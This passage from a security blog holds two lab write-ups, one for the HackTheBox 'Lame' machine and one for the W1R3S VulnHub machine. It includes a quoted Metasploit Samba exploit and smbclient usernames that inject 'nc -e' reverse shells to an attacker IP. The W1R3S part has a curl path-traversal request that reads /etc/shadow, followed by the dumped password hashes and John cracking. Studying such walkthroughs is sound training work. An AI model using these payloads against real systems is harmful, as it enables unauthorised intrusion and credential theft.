class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.2</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)</span><br><span class="line">|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: lame</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: hackthebox.gr</span><br><span class="line">|   FQDN: lame.hackthebox.gr</span><br><span class="line">|_  System time: 2023-02-27T08:32:50-05:00</span><br><span class="line">|_clock-skew: mean: 2h29m49s, deviation: 3h32m12s, median: -13s</span><br></pre></td></tr></table></figure>

<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h4 id="Anonymous-login"><a href="#Anonymous-login" class="headerlink" title="Anonymous login"></a>Anonymous login</h4><p>​	Howerer ,there is nothing in ftp server</p>
<h4 id="vsFTPd-2-3-4"><a href="#vsFTPd-2-3-4" class="headerlink" title="vsFTPd 2.3.4"></a>vsFTPd 2.3.4</h4><p>​	From nmap report or using <code>nc -nv 10.10.10.3 12</code> to get its ftp title ,we can find ftp server’s version is vsFTPd 2.3.4. So we can try searchsploit.We find two explolit.So just try if it could get the shell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit vsFTPd 2.3.4    </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                   |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However,the exploit don’t work. The python exploit finally give result says time out.</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><h4 id="Anonymous-login-1"><a href="#Anonymous-login-1" class="headerlink" title="Anonymous login"></a>Anonymous login</h4><p>First, list mb sharename</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L  //10.10.10.3    </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        tmp             Disk      oh noes!</span><br><span class="line">        opt             Disk      </span><br><span class="line">        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            LAME</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>After trying,it gives me two information:</p>
<ul>
<li>1.we can access into &#x2F;tmp,but there aren’t useful information.</li>
<li>2.SMB server  version: Samba 3.0.20-Debain</li>
</ul>
<h4 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h4><p>Try searchsploit again,and get following result:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Samba 3.0.20-Debain                                                                                                         </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> Exploit Title                          |  Path</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                | multiple/remote/10095.txt</span><br><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#x27;Username&#x27; map script&#x27; Command Execution (Metasploit)      | unix/remote/16320.rb</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                                 | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                         | linux_x86/dos/36741.py</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br></pre></td></tr></table></figure>

<p>And we choose this one :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#x27;Username&#x27; map script&#x27; Command Execution (Metasploit) | unix/remote/16320.rb</span><br><span class="line"></span><br><span class="line"> Exploit :</span><br><span class="line"> def exploit</span><br><span class="line"></span><br><span class="line">                connect</span><br><span class="line"></span><br><span class="line">                # lol?</span><br><span class="line">                username = &quot;/=`nohup &quot; + payload.encoded + &quot;`&quot;</span><br><span class="line">                begin</span><br><span class="line">                        simple.client.negotiate(false)</span><br><span class="line">                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore[&#x27;SMBDomain&#x27;], false)</span><br><span class="line">                rescue ::Timeout::Error, XCEPT::LoginError</span><br><span class="line">                        # nothing, it either worked or it didn&#x27;t ;)</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                handler</span><br><span class="line">        end</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Analyze it,we can find that using  a malicious command-like string as username to login into smb server leading to a reverse shell.</p>
<p>payload :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/= `nohup nc -e x.x.x.x xxx`&quot;</span><br></pre></td></tr></table></figure>

<p>Howere it don’t work when using such a command </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.3/tmp -U &#x27;./=`nohup nc -e /bin/sh 10.10.14.2 4444`&#x27;</span><br></pre></td></tr></table></figure>

<p>but we can use another way to got it , and it’s a root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; logon &quot;/=`nohup nc -e /bin/bash 10.10.14.2 4444`&quot;</span><br><span class="line"></span><br><span class="line">root@lame:/# id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<p>Then got a nicer shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">or</span><br><span class="line">SHELL=/bin/bash script -q </span><br></pre></td></tr></table></figure>

<p>got flag </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@lame:/# find / -name user.txt         </span><br><span class="line">/home/makis/user.txt</span><br><span class="line">root@lame:/# cat /home/makis/u</span><br><span class="line">f2e045ad2a9a58c16818ed10c3d12fb9</span><br><span class="line"></span><br><span class="line">root@lame:/# cat /home/makis/u</span><br><span class="line">f2e045ad2a9a58c16818ed10c3d12fb9</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/af55ad8e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/af55ad8e.html" class="post-title-link" itemprop="url">w1r3s</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-12-20 20:42:32" itemprop="dateCreated datePublished" datetime="2022-12-20T20:42:32+08:00">2022-12-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:29:24" itemprop="dateModified" datetime="2024-09-28T20:29:24+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="W1R3S靶机wp"><a href="#W1R3S靶机wp" class="headerlink" title="W1R3S靶机wp"></a>W1R3S靶机wp</h1><h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><h3 id="内网网段扫描"><a href="#内网网段扫描" class="headerlink" title="内网网段扫描"></a>内网网段扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.137.0/24</span><br></pre></td></tr></table></figure>

<p>​	此处为本地靶机，目标ip地址为：192.168.137.4</p>
<h2 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h2><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><h4 id="tcp扫描-SYN扫描"><a href="#tcp扫描-SYN扫描" class="headerlink" title="tcp扫描(SYN扫描)"></a>tcp扫描(SYN扫描)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS --min-rate 10000 -p- 192.168.137.4 </span><br></pre></td></tr></table></figure>

<p>扫描获得21，22，80，3306端口开放</p>
<p>然后对指定端口进行进一步的扫描 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O -p21,22,80,3306 192.168.137.4</span><br></pre></td></tr></table></figure>

<p>扫描结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">TCPscan</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:59:30:73 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>​	进一步利用nmap自带的vuln脚本进行简单漏扫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script=vuln -p21,22,80,3306 192.168.137.4</span><br></pre></td></tr></table></figure>

<p>扫描结果如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>



<h4 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --min-rate 10000 -p- 192.168.137.4</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE  SERVICE</span><br><span class="line">3306/udp closed mysql</span><br><span class="line">MAC Address: 00:0C:29:59:30:73 (VMware)</span><br></pre></td></tr></table></figure>

<h2 id="FTP端口"><a href="#FTP端口" class="headerlink" title="FTP端口"></a>FTP端口</h2><p>存在ftp端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.137.4</span><br></pre></td></tr></table></figure>

<p>进入到ftp服务器中，此处利用匿名进行试探</p>
<p>即用户名为:anonymous，密码为空</p>
<p>成功登录。</p>
<p>进入后有三个目录，总体内容信息整理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">02.txt</span><br><span class="line"></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce : MD5 : This is not a password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg== : base64 : It is easy, but not that easy..</span><br><span class="line"></span><br><span class="line">03.txt </span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line"></span><br><span class="line">employs-name.txt</span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">worktodo.txt</span><br><span class="line">we have a ןot of work to do‘ stop pןayıng around˙˙˙˙</span><br><span class="line">ı don&#x27;t thınk thıs ıs the way to root!</span><br></pre></td></tr></table></figure>

<p>可以发现此处并没有我们想要的信息</p>
<h2 id="80端口探测"><a href="#80端口探测" class="headerlink" title="80端口探测"></a>80端口探测</h2><p>利用浏览器登入，发现没有用</p>
<p><img src="/./w1r3s/image-20221220200652159.png" alt="image-20221220200652159"></p>
<p>然后进行目录爆破，利用feroxburster进行爆破，获取有效信息整理如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.4/</span><br><span class="line">http://192.168.137.4/administrator :Cuppa CMS</span><br><span class="line">http://192.168.137.4/javascript =&gt; http://192.168.137.4/javascript/</span><br><span class="line">http://192.168.137.4/wordpress =&gt; http://192.168.137.4/wordpress/</span><br><span class="line">http://192.168.137.4/javascript/jquery =&gt; http://192.168.137.4/javascript/jquery/</span><br><span class="line">http://192.168.137.4/administrator/components =&gt; http://192.168.137.4/administrator/components/</span><br><span class="line">http://192.168.137.4/administrator/templates =&gt; http://192.168.137.4/administrator/templates/</span><br><span class="line">http://192.168.137.4/administrator/media =&gt; http://192.168.137.4/administrator/media/</span><br><span class="line">http://192.168.137.4/administrator/language =&gt; http://192.168.137.4/administrator/language/</span><br><span class="line">http://192.168.137.4/administrator/js =&gt; http://192.168.137.4/administrator/js/</span><br><span class="line">http://192.168.137.4/administrator/api =&gt; http://192.168.137.4/administrator/api/</span><br><span class="line">http://192.168.137.4/administrator/classes =&gt; http://192.168.137.4/administrator/classes/</span><br><span class="line">http://192.168.137.4/wordpress/wp-includes =&gt; http://192.168.137.4/wordpress/wp-includes/</span><br><span class="line">http://192.168.137.4/wordpress/wp-admin =&gt; http://192.168.137.4/wordpress/wp-admin/</span><br><span class="line">http://192.168.137.4/administrator/api/administrator =&gt; http://192.168.137.4/administrator/api/administrator/</span><br><span class="line">http://192.168.137.4/administrator/api/test =&gt; http://192.168.137.4/administrator/api/test/</span><br><span class="line">http://192.168.137.4/wordpress/wp-content =&gt; http://192.168.137.4/wordpress/wp-content/</span><br><span class="line">http://192.168.137.4/administrator/classes/ajax =&gt; http://192.168.137.4/administrator/classes/ajax/</span><br><span class="line">http://192.168.137.4/administrator/components/menu =&gt; http://192.168.137.4/administrator/components/menu/</span><br><span class="line">http://192.168.137.4/administrator/components/menu/classes =&gt; http://192.168.137.4/administrator/components/menu/classes/</span><br><span class="line">http://192.168.137.4/administrator/components/menu/html =&gt; http://192.168.137.4/administrator/components/menu/html/</span><br><span class="line">http://192.168.137.4/administrator/templates/default =&gt; http://192.168.137.4/administrator/templates/default/</span><br><span class="line">http://192.168.137.4/administrator/installation =&gt; http://192.168.137.4/administrator/installation/</span><br><span class="line">http://192.168.137.4/administrator/components/stats =&gt; http://192.168.137.4/administrator/components/stats/</span><br><span class="line">http://192.168.137.4/administrator/components/permissions =&gt; http://192.168.137.4/administrator/components/permissions/</span><br></pre></td></tr></table></figure>

<p>可以发现，内容主要有三类，一类是wordpress目录下的，一类是javascript目录下的，一类是administrator目录下的。这都是我们的可利用攻击面，此处我选择了先对administrator进行探测。</p>
<p>然后获取到几个信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cuppa Cms</span><br><span class="line">Administrator account :default:  username::admin password::admin  </span><br><span class="line">Administrator&#x27;s user created  No =&gt; admin account already have </span><br></pre></td></tr></table></figure>

<p>然后利用searchsploit对cuppa cms进行了简单搜查，然后搜查到了一个任意文件包含漏洞</p>
<p>有可能跟编码有关，但我们同时也可以注意到这里是Request，所以我们在尝试一下利用post进行访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d urlConfig=../../../../../../../../../../../etc/passwd http://192.168.137.4/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>


<p>发现成功利用，于是我们在试着能不能搜集到&#x2F;etc&#x2F;shadow的信息，发现可以搜集到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line">sync:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>然后利用john进行破解，发现成功破解到密码</p>
<p>www-data         (www-data)<br>computer         (w1r3s)</p>
<p>于是我们利用ssh登陆上，然后再查看sudo的权限,发现此处w1r3s的权限都是ALL，可以说明，此台机器已经全部拿下。<br>并在&#x2F;root目录下找到了flag.txt文件</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/3418e521.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
